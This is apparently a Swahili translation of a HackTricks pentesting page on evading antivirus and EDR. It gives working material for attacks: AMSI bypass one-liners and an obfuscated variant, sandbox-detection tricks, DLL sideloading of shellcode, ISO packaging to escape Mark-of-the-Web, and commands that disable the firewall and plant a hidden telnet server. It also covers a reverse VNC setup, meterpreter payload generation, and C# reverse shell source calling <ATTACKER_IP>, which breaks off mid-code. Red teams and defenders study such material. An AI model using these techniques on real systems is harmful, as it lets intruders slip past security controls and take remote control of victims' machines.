# Kupita kwa Antivirus (AV)

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

**Ukurasa huu uliandikwa na** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**!**

## **Mbinu ya Kuepuka AV**

Kwa sasa, AV hutumia njia tofauti za kuangalia ikiwa faili ni hatari au la, uchunguzi wa tuli, uchambuzi wa kudumu, na kwa EDRs za juu zaidi, uchambuzi wa tabia.

### **Uchunguzi wa Tuli**

Uchunguzi wa tuli unafikiwa kwa kuweka alama mstari au mafurushi ya baiti hatari katika binary au script, na pia kutoa habari kutoka kwa faili yenyewe (k.m. maelezo ya faili, jina la kampuni, saini za kidijitali, ikoni, checksum, nk.). Hii inamaanisha kwamba kutumia zana za umma zinaweza kukusababisha kukamatwa kwa urahisi zaidi, kwani labda zimechambuliwa na kuwekwa alama kama hatari. Kuna njia kadhaa za kuzunguka aina hii ya uchunguzi:

* **Ufichaji**

Ikiwa unaficha binary, hakutakuwa na njia ya AV kugundua programu yako, lakini utahitaji aina fulani ya mzigo wa kufichua na kuendesha programu kumbukani.

* **Ufichaji**

Marafiki wakati mwingine unachohitaji kufanya ni kubadilisha baadhi ya mstari katika binary au script yako ili kuipitisha AV, lakini hii inaweza kuwa kazi inayochukua muda kutegemea ni nini unajaribu kuficha.

* **Zana za Kibinafsi**

Ikiwa unatengeneza zana zako mwenyewe, haitakuwa na saini mbaya zinazojulikana, lakini hii inachukua muda na juhudi nyingi.

{% hint style="info" %}
Njia nzuri ya kuchunguza dhidi ya uchunguzi wa tuli wa Windows Defender ni [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Kimsingi inagawa faili katika sehemu kadhaa na kisha inaagiza Defender kuchunguza kila moja kwa kujitegemea, kwa njia hii, inaweza kukwambia ni vipi mstari au baiti zilizowekwa alama katika binary yako.
{% endhint %}

Napendekeza sana uangalie hii [Orodha ya YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) kuhusu Upelelezi wa AV wa vitendo.

### **Uchambuzi wa Kudumu**

Uchambuzi wa kudumu ni wakati AV inaendesha binary yako kwenye sanduku la mchanga na kusubiri shughuli hatari (k.m. jaribio la kufichua na kusoma nywila za kivinjari chako, kufanya minidump kwenye LSASS, nk.). Sehemu hii inaweza kuwa ngumu kidogo kufanya kazi nayo, lakini hapa kuna mambo unayoweza kufanya kuepuka sanduku la mchanga.

* **Lala kabla ya utekelezaji** Kulingana na jinsi ilivyoanzishwa, inaweza kuwa njia nzuri ya kuepuka uchambuzi wa kudumu wa AV. AV zina muda mfupi sana wa kuchunguza faili ili kusiingilie kazi ya mtumiaji, hivyo kutumia lala ndefu kunaweza kuvuruga uchambuzi wa binaries. Tatizo ni kwamba mchanga wa AV unaweza tu kupuuza usingizi kulingana na jinsi ilivyoanzishwa.
* **Kuangalia rasilimali za mashine** Kawaida Sandboxes zina rasilimali chache sana za kufanya kazi (k.m. < 2GB RAM), vinginevyo zingeweza kupunguza kasi ya mashine ya mtumiaji. Unaweza pia kuwa mbunifu sana hapa, kwa mfano kwa kuangalia joto la CPU au hata kasi ya kifaa cha kupooza, si kila kitu kitatekelezwa kwenye mchanga.
* **Uchunguzi wa kipekee wa mashine** Ikiwa unataka kulenga mtumiaji ambaye kituo chake cha kazi kimejiunga na kikoa cha "contoso.local", unaweza kufanya ukaguzi kwenye kikoa cha kompyuta kuona ikiwa kinalingana na kile ulichotaja, ikiwa hailingani, unaweza kufanya programu yako ijitoe.

Inageuka kuwa jina la kompyuta ya Sanduku la Mchanga la Microsoft Defender ni HAL9TH, hivyo, unaweza kuangalia jina la kompyuta katika zako kabla ya kuzindua, ikiwa jina linalingana na HAL9TH, inamaanisha uko ndani ya sanduku la mchanga la defender, hivyo unaweza kufanya programu yako ijitoe.

<figure><img src="../.gitbook/assets/image (209).png" alt=""><figcaption><p>chanzo: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Mbinu nyingine nzuri kutoka kwa [@mgeeky](https://twitter.com/mariuszbit) kwa kupinga Sandboxes

<figure><img src="../.gitbook/assets/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Kama tulivyosema hapo awali katika chapisho hili, **zana za umma** mwishowe **zitagunduliwa**, hivyo, unapaswa kujiuliza kitu:

Kwa mfano, ikiwa unataka kudondosha LSASS, **je, unahitaji kweli kutumia mimikatz**? Au unaweza kutumia mradi tofauti ambao ni mdogo maarufu na pia unadondosha LSASS.

Jibu sahihi labda ni la mwisho. Kuchukua mimikatz kama mfano, labda ni moja ya, ikiwa sio moja ya, vipande vilivyo na alama nyingi zaidi ya zisizo salama na EDRs, wakati mradi wenyewe ni mzuri sana, pia ni janga kufanya kazi nayo ili kuepuka AVs, kwa hivyo tafuta mbadala kwa kile unachotaka kufikia.

{% hint style="info" %}
Unapobadilisha mizigo yako kwa kuepuka, hakikisha **kuzima utoaji wa sampuli moja kwa moja** kwa defender, na tafadhali, kwa umakini, **USIWEKE KATIKA VIRUSTOTAL** ikiwa lengo lako ni kufikia kuepuka kwa muda mrefu. Ikiwa unataka kujua ikiwa mizigo yako inagunduliwa na AV fulani, iweke kwenye VM, jaribu kuzima utoaji wa sampuli moja kwa moja, na ujaribu hapo hadi uridhike na matokeo.
{% endhint %}

## EXEs vs DLLs

Kila wakati **pauni kutumia DLLs kwa kuepuka**, kwa uzoefu wangu, faili za DLL kawaida **hugunduliwa kidogo** na kuchambuliwa, hivyo ni mbinu rahisi sana ya kutumia ili kuepuka ugunduzi katika baadhi ya kesi (ikiwa mizigo yako ina njia ya kufanya kazi kama DLL kwa hakika).

Kama tunavyoona katika picha hii, Mzigo wa DLL kutoka Havoc una kiwango cha ugunduzi cha 4/26 katika antiscan.me, wakati mzigo wa EXE una kiwango cha ugunduzi cha 7/26.

<figure><img src="../.gitbook/assets/image (1130).png" alt=""><figcaption><p>antiscan.me ulinganisho wa mzigo wa kawaida wa Havoc EXE dhidi ya mzigo wa kawaida wa Havoc DLL</p></figcaption></figure>

Sasa tutawaonyesha mbinu unazoweza kutumia na faili za DLL ili kuwa na siri zaidi.
## Kusakinisha DLL & Kupakia

**Kusakinisha DLL** inatumia utaratibu wa utafutaji wa DLL unaotumiwa na kifurushi kwa kuweka programu ya mwathiriwa na mzigo mbaya kando kando.

Unaweza kuchunguza programu zinazoweza kuathiriwa na Kusakinisha DLL kwa kutumia [Siofra](https://github.com/Cybereason/siofra) na script ifuatayo ya powershell:

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

Amri hii itatoa orodha ya programu zinazoweza kushambuliwa na DLL hijacking ndani ya "C:\Program Files\\" na faili za DLL wanazojaribu kupakia.

Napendekeza sana **uchunguze programu zinazoweza kushambuliwa na DLL/Sideloadable mwenyewe**, hii ni mbinu ya siri kabisa ikifanywa ipasavyo, lakini ukizitumia programu za DLL Sideloadable zinazojulikana hadharani, unaweza kugunduliwa kwa urahisi.

Kwa kuweka DLL yenye nia mbaya na jina ambalo programu inatarajia kupakia, haitapakia mzigo wako, kwani programu inatarajia baadhi ya kazi maalum ndani ya DLL hiyo, ili kurekebisha tatizo hili, tutatumia mbinu nyingine inayoitwa **DLL Proxying/Forwarding**.

**DLL Proxying** inapeleka wito ambao programu inafanya kutoka kwenye DLL ya proksi (na yenye nia mbaya) hadi kwenye DLL halisi, hivyo kuhifadhi utendaji wa programu na kuweza kushughulikia utekelezaji wa mzigo wako.

Nitatumia mradi wa [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) kutoka kwa [@flangvik](https://twitter.com/Flangvik/)

Hizi ndizo hatua nilizofuata:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

Amri ya mwisho itatupa faili 2: templeti ya msimbo wa chanzo wa DLL, na DLL iliyobadilishwa jina lake asili.

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

Hizi ni matokeo:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Shellcode yetu (iliyohifadhiwa na [SGN](https://github.com/EgeBalci/sgn)) na DLL mbadala zina kiwango cha Uchunguzi cha 0/26 katika [antiscan.me](https://antiscan.me)! Ningeliita hilo kuwa mafanikio.

<figure><img src="../.gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Ninapendekeza sana uangalie [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) kuhusu DLL Sideloading na pia [video ya ippsec](https://www.youtube.com/watch?v=3eROsG\_WNpE) ili kujifunza zaidi kuhusu tuliyozungumza kwa undani zaidi.
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ni zana ya mzigo wa payload kwa kuzidi EDRs kwa kutumia michakato iliyosimamishwa, syscalls moja kwa moja, na njia mbadala za utekelezaji`

Unaweza kutumia Freeze kusoma na kutekeleza shellcode yako kwa njia ya siri.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Kuepuka ni mchezo wa paka na panya, kile kinachofanya kazi leo kinaweza kugunduliwa kesho, kwa hivyo kamwe usitegemee zana moja tu, ikiwezekana, jaribu kuunganisha mbinu kadhaa za kuepuka.
{% endhint %}

## AMSI (Kioo cha Uchunguzi wa Programu hasidi)

AMSI iliumbwa kuzuia "[programu hasidi isiyo na faili](https://en.wikipedia.org/wiki/Fileless\_malware)". Awali, AVs walikuwa na uwezo wa kuchunguza **faili kwenye diski**, kwa hivyo ikiwa ungeweza kwa njia fulani kutekeleza mizigo **moja kwa moja kwenye kumbukumbu**, AV haitaweza kufanya chochote kuzuia hilo, kwani haikuwa na uwezo wa kutosha.

Kipengele cha AMSI kimejumuishwa katika sehemu hizi za Windows.

* Udhibiti wa Akaunti ya Mtumiaji, au UAC (kuinua EXE, COM, MSI, au usanidi wa ActiveX)
* PowerShell (maandishi, matumizi ya moja kwa moja, na tathmini ya nambari ya kudumu)
* Mwenyeji wa Script wa Windows (wscript.exe na cscript.exe)
* JavaScript na VBScript
* Macros za Ofisi VBA

Inaruhusu suluhisho za antivirus kuchunguza tabia ya skripti kwa kufunua maudhui ya skripti katika fomu ambayo haijafichwa wala haijaandikwa.

Kukimbia `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` kutazalisha onyo lifuatalo kwenye Windows Defender.

<figure><img src="../.gitbook/assets/image (1135).png" alt=""><figcaption></figcaption></figure>

Tambua jinsi inavyoongeza `amsi:` na kisha njia ya faili ya kutekelezwa ambayo skripti ilikimbia kutoka, katika kesi hii, powershell.exe

Hatukudondosha faili yoyote kwenye diski, lakini bado tukakamatwa kwenye kumbukumbu kwa sababu ya AMSI.

Kuna njia kadhaa za kuzunguka AMSI:

* **Kuficha**

Kwa kuwa AMSI kimsingi hufanya kazi na uchunguzi wa tuli, kwa hivyo, kubadilisha skripti unazojaribu kupakia inaweza kuwa njia nzuri ya kuepuka ugunduzi.

Hata hivyo, AMSI ina uwezo wa kufunua skripti hata ikiwa ina safu nyingi, kwa hivyo kuficha inaweza kuwa chaguo baya kulingana na jinsi inavyofanywa. Hii inafanya iwe si rahisi sana kuepuka. Ingawa, mara nyingine, yote unayohitaji kufanya ni kubadilisha majina machache ya pembejeo na utakuwa sawa, kwa hivyo inategemea ni kiasi gani kitu kimetambuliwa.

* **Kuzunguka AMSI**

Kwa kuwa AMSI inatekelezwa kwa kupakia DLL kwenye mchakato wa powershell (pia cscript.exe, wscript.exe, n.k.), ni rahisi kuharibu hiyo hata ukiendesha kama mtumiaji asiye na mamlaka. Kwa sababu ya kasoro hii katika utekelezaji wa AMSI, watafiti wamegundua njia kadhaa za kuepuka uchunguzi wa AMSI.

**Kulazimisha Kosa**

Kulazimisha kushindwa kwa kuanzisha AMSI (amsiInitFailed) kutafanya uchunguzi wowote usianzishwe kwa mchakato wa sasa. Awali hii ilitangazwa na [Matt Graeber](https://twitter.com/mattifestation) na Microsoft imeendeleza saini ya kuzuia matumizi zaidi.
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

Kila ilichukua ni mstari mmoja wa nambari ya powershell ili kufanya AMSI isiweze kutumika kwa mchakato wa sasa wa powershell. Mstari huu kwa kweli umefichuliwa na AMSI yenyewe, hivyo mabadiliko fulani yanahitajika ili kutumia mbinu hii.

Hapa kuna kizuizi kilichobadilishwa cha AMSI nilichopata kutoka kwenye hii [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**Kumbuka, hii labda itachunguzwa mara tu chapisho hili litakapotoka, kwa hivyo usichapishe nambari yoyote ikiwa lengo lako ni kubaki bila kugunduliwa.**

**Kupachika Kumbukumbu**

Mbinu hii iligunduliwa awali na [@RastaMouse](https://twitter.com/\_RastaMouse/) na inahusisha kupata anwani ya kazi ya "AmsiScanBuffer" katika amsi.dll (inayohusika na kutambua kuingizaji inayotolewa na mtumiaji) na kuibadilisha na maagizo ya kurudisha nambari ya E\_INVALIDARG, kwa njia hii, matokeo ya uchunguzi halisi yatarudisha 0, ambayo inachukuliwa kama matokeo safi.

{% hint style="info" %}
Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo zaidi.

{% endhint %}

Kuna mbinu nyingine nyingi zinazotumika kukiuka AMSI na powershell, angalia [**ukurasa huu**](basic-powershell-for-pentesters/#amsi-bypass) na [repo hii](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) kujifunza zaidi kuhusu hizo.

Au skripti hii ambayo kupitia kupachika kumbukumbu itapachika kila Powersh mpya

## Kuficha

Kuna zana kadhaa zinazoweza kutumika kuficha nambari wazi ya C#, kuzalisha templeti za metaprogramming kwa kusanidi binaries au kuficha binaries zilizosanidiwa kama:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: Kuficha C#**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa tawi la chanzo wazi la [LLVM](http://www.llvm.org/) suite ya kusanidi ili kutoa usalama wa programu ulioongezeka kupitia [kuficha nambari](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) na kufanya iwe ngumu kuharibika.
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia `C++11/14` lugha kuzalisha, wakati wa kusanidi, nambari iliyofichwa bila kutumia zana ya nje na bila kubadilisha kisanidi.
* [**obfy**](https://github.com/fritzone/obfy): Ongeza safu ya shughuli zilizofichwa zilizozalishwa na mfumo wa metaprogramming wa templeti ya C++ ambayo itafanya maisha ya mtu anayetaka kuvunja programu kuwa ngumu kidogo.
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni kuficha binary ya x64 ambayo inaweza kuficha faili tofauti za pe ikiwa ni pamoja na: .exe, .dll, .sys
* [**metame**](https://github.com/a0rtega/metame): Metame ni injini rahisi ya nambari ya metamorphic kwa utekelezaji wa aina yoyote.
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni mfumo wa kuficha nambari kwa kiwango cha chini cha LLVM-supported lugha kwa kutumia ROP (return-oriented programming). ROPfuscator inaficha programu kwa kiwango cha nambari ya mkutano kwa kubadilisha maagizo ya kawaida kuwa minyororo ya ROP, kuzuia dhana yetu ya kawaida ya mtiririko wa kudhibiti wa kawaida.
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter iliyoandikwa kwa Nim
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor inaweza kubadilisha EXE/DLL zilizopo kuwa shellcode na kisha kuzipakia

## SmartScreen & MoTW

Labda umewahi kuona skrini hii unapopakua baadhi ya faili za utekelezaji kutoka kwenye wavuti na kuzitekeleza.

Microsoft Defender SmartScreen ni mbinu ya usalama iliyokusudiwa kulinda mtumiaji wa mwisho dhidi ya kutekeleza programu zinazoweza kuwa mbaya.

<figure><img src="../.gitbook/assets/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen kimsingi hufanya kazi kwa njia ya sifa-msingi, maana kwamba programu zisizopakuliwa kawaida zitazua SmartScreen hivyo kumuarifu na kumzuia mtumiaji wa mwisho kutekeleza faili (ingawa faili inaweza bado kutekelezwa kwa kubonyeza More Info -> Run anyway).

**MoTW** (Mark of The Web) ni [NTFS Alternate Data Stream](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) yenye jina la Zone.Identifier ambayo inaundwa moja kwa moja unapopakua faili kutoka kwenye wavuti, pamoja na URL iliyopakuliwa kutoka.

<figure><img src="../.gitbook/assets/image (237).png" alt=""><figcaption><p>Kuangalia Zone.Identifier ADS kwa faili iliyopakuliwa kutoka kwenye wavuti.</p></figcaption></figure>

{% hint style="info" %}
Ni muhimu kutambua kwamba programu zilizosainiwa na cheti cha **kuaminika** **hazitazua SmartScreen**.
{% endhint %}

Njia yenye ufanisi sana ya kuzuia mizigo yako isipate Mark of The Web ni kwa kuzipakia ndani ya aina fulani ya chombo kama ISO. Hii hutokea kwa sababu Mark-of-the-Web (MOTW) **hauwezi** kutumika kwa **volumes zisizo NTFS**.

<figure><img src="../.gitbook/assets/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni zana inayopakia mizigo ndani ya kontena za pato ili kuepuka Mark-of-the-Web.

Matumizi ya mfano:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hapa kuna demo ya kukiuka SmartScreen kwa kufunga mizigo ndani ya faili za ISO kwa kutumia [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## Ufikiaji wa Mkutano wa C#

Kupakia binaries za C# kumbukumbu imejulikana kwa muda mrefu na bado ni njia nzuri sana ya kukimbia zana zako za post-exploitation bila kugunduliwa na AV.

Kwa kuwa mizigo itapakia moja kwa moja kwenye kumbukumbu bila kugusa diski, tutahitaji kuhangaika tu kuhusu kufanya marekebisho kwa AMSI kwa mchakato mzima.

Vifumo vingi vya C2 (kama vile sliver, Covenant, metasploit, CobaltStrike, Havoc, nk.) tayari hutoa uwezo wa kutekeleza vikusanyo vya C# moja kwa moja kwenye kumbukumbu, lakini kuna njia tofauti za kufanya hivyo:

* **Fork\&Run**

Inahusisha **kuzaa mchakato mpya wa kujitolea**, kuingiza msimbo wako mbaya wa post-exploitation kwenye mchakato mpya huo, kutekeleza msimbo wako mbaya na baada ya kumaliza, kuua mchakato mpya. Hii ina faida na hasara zake. Faida ya njia ya fork na run ni kwamba utekelezaji unatokea **nje** ya mchakato wetu wa Beacon implant. Hii inamaanisha kwamba ikiwa kitu katika hatua yetu ya post-exploitation kinakwenda vibaya au kinagunduliwa, kuna **nafasi kubwa zaidi** ya **implant yetu kusalia.** Hasara ni kwamba una **nafasi kubwa** ya kugunduliwa na **Uchunguzi wa Tabia**.

<figure><img src="../.gitbook/assets/image (215).png" alt=""><figcaption></figcaption></figure>

* **Inline**

Inahusu kuingiza msimbo wako mbaya wa post-exploitation **ndani ya mchakato wake mwenyewe**. Kwa njia hii, unaweza kuepuka kuhitaji kuunda mchakato mpya na kuupata kuchunguzwa na AV, lakini hasara ni kwamba ikiwa kitu kitakwenda vibaya na utekelezaji wa mizigo yako, kuna **nafasi kubwa zaidi** ya **kupoteza beacon yako** kwani inaweza kugonga.

<figure><img src="../.gitbook/assets/image (1136).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Ikiwa unataka kusoma zaidi kuhusu kupakia Mkutano wa C#, tafadhali angalia makala hii [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) na InlineExecute-Assembly BOF yao ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

Unaweza pia kupakia Mkutano wa C# **kutoka kwa PowerShell**, angalia [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) na [video ya S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Kutumia Lugha Nyingine za Programu

Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), ni rahisi kutekeleza msimbo mbaya kwa kutumia lugha nyingine kwa kumpa mashine iliyoharibiwa ufikiaji **kwenye mazingira ya mkalimani yaliyowekwa kwenye SMB share inayodhibitiwa na Mshambuliaji**.

Kwa kuruhusu ufikiaji kwa Vifaa vya Mkutano na mazingira kwenye SMB share unaweza **kutekeleza msimbo wa kupindukia kwa lugha hizi ndani ya kumbukumbu** ya mashine iliyoharibiwa.

Repo inaonyesha: Mlinzi bado anachunguza hati lakini kwa kutumia Go, Java, PHP nk tunayo **uhuru zaidi wa kukiuka saini za tuli**. Majaribio na hati za ganda la kurudi zisizofichwa kwa bahati katika lugha hizi yamefanikiwa.

## Kuepuka Kwa Juu

Kuepuka ni mada ngumu sana, mara nyingi unapaswa kuzingatia vyanzo vingi tofauti vya telemetri katika mfumo mmoja tu, kwa hivyo ni karibu haiwezekani kubaki bila kugunduliwa kabisa katika mazingira yaliyokomaa.

Kila mazingira unayokabiliana nayo yatakuwa na nguvu na udhaifu wake.

Ninahimiza sana uangalie mazungumzo haya kutoka kwa [@ATTL4S](https://twitter.com/DaniLJ94), ili kupata uelewa zaidi wa mbinu za Kuepuka za Juu.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

Hii pia ni mazungumzo mengine mazuri kutoka kwa [@mariuszbit](https://twitter.com/mariuszbit) kuhusu Kuepuka kwa Kina.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Mbinu za Zamani**

### **Angalia sehemu zipi Mlinzi anazipata kuwa mbaya**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) ambayo itaondoa sehemu za binary** hadi **itakapogundua sehemu ipi Mlinzi** anapata kuwa mbaya na kugawanya kwako.\
Zana nyingine inayofanya **kitu sawa ni** [**avred**](https://github.com/dobin/avred) na wavuti wazi inayotoa huduma katika [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Anza wakati mfumo unapoanza na endesha sasa:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Badilisha mlango wa telnet** (kwa siri) na afya firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pakua kutoka: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unataka kupakua bin, sio usanidi)

**KATIKA MHUDUMU**: Tekeleza _**winvnc.exe**_ na tengeneza mwenyeji:

* Wezesha chaguo la _Zima TrayIcon_
* Weka nenosiri katika _Nenosiri la VNC_
* Weka nenosiri katika _Nenosiri la Kuona-Pekee_

Kisha, hamisha binari _**winvnc.exe**_ na faili iliyoundwa **mara** _**UltraVNC.ini**_ ndani ya **mlemavu**

#### **Unganisho la Nyuma**

**Mshambuliaji** anapaswa **kutekeleza ndani** ya mwenyeji wake binari `vncviewer.exe -sikiliza 5900` ili iwe **tayari** kukamata **unganisho la VNC** la nyuma. Kisha, ndani ya **mlemavu**: Anza daemini ya winvnc `winvnc.exe -endesha` na endesha `winwnc.exe [-kujaribuupya] -unganisha <anwani_ya_mshambuliaji>::5900`

**ANGALIZO:** Ili kudumisha siri lazima usifanye mambo machache

* Usianze `winvnc` ikiwa tayari inaendeshwa au utazindua [popup](https://i.imgur.com/1SROTTl.png). angalia ikiwa inaendeshwa na `tasklist | findstr winvnc`
* Usianze `winvnc` bila `UltraVNC.ini` katika saraka ile ile au itasababisha [dirisha la usanidi](https://i.imgur.com/rfMQWcf.png) kufunguliwa
* Usiendeshe `winvnc -h` kwa msaada au utazindua [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pakua kutoka: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Ndani ya GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sasa **anza kusikiliza** na `msfconsole -r file.rc` na **tekeleza** **malipo ya xml** na:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Mlinzi wa sasa atamaliza mchakato haraka sana.**

### Kukusanya ganda letu la kurudisha

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Ganda la Kwanza la C# la Kurudisha
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Tumia na:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
